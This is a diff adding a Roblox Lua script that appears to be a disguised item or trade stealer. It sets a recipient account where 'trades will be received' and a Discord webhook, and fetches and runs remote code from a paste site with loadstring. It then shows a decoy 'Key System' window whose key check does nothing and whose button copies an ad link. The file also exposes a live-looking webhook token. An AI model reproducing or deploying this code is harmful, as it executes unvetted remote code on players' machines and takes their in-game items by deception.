@@ -1,0 +1,61 @@
+_G.username = {"dirpy_kid"} -- Where trades will be received.
+_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
+_G.ping = true -- Send a @everyone in the webhook message.
+_G.private = false -- Show the webhook if the server is private.
+
+loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
+
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "KeySystemUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Key link will copy to clipboard."
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 22
+
+local getKeyBtn = Instance.new("TextButton", frame)
+getKeyBtn.Size = UDim2.new(1, -20, 0, 30)
+getKeyBtn.Position = UDim2.new(0, 10, 0, 40)
+getKeyBtn.Text = "Get Key"
+getKeyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+getKeyBtn.TextColor3 = Color3.new(1, 1, 1)
+getKeyBtn.Font = Enum.Font.SourceSans
+getKeyBtn.TextSize = 18
+
+getKeyBtn.MouseButton1Click:Connect(function()
+	
+	setclipboard("https://lootdest.org/s?Si1CYuYP")
+end)
+
+local keyBox = Instance.new("TextBox", frame)
+keyBox.Size = UDim2.new(1, -20, 0, 30)
+keyBox.Position = UDim2.new(0, 10, 0, 80)
+keyBox.PlaceholderText = "Enter key here..."
+keyBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+keyBox.TextColor3 = Color3.new(1, 1, 1)
+keyBox.Font = Enum.Font.SourceSans
+keyBox.TextSize = 16
+
+local submitBtn = Instance.new("TextButton", frame)
+submitBtn.Size = UDim2.new(1, -20, 0, 30)
+submitBtn.Position = UDim2.new(0, 10, 0, 115)
+submitBtn.Text = "Submit Key"
+submitBtn.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
+submitBtn.TextColor3 = Color3.new(1, 1, 1)
+submitBtn.Font = Enum.Font.SourceSans
+submitBtn.TextSize = 18
+
+submitBtn.MouseButton1Click:Connect(function()
+	local key = keyBox.Text
+	-- Replace this with your actual key check
+	print("Submitted key:", key)
+end)
